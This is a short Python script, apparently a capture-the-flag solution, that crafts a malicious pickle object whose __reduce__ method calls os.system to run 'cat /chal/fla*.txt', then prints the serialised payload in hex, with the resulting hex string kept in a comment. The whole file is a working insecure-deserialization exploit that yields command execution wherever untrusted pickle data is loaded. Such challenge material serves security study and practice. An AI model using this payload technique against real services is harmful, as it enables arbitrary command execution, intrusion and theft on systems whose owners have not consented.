import os
import pickle


class Exploit:
    def __reduce__(self):
        return os.system, ("cat /chal/fla*.txt",)


if __name__ == '__main__':
    pic = pickle.dumps(Exploit())
    print(pic.hex())

# '8004952d000000000000008c05706f736978948c0673797374656d9493948c12636174202f6368616c2f666c612a2e74787494859452942e'
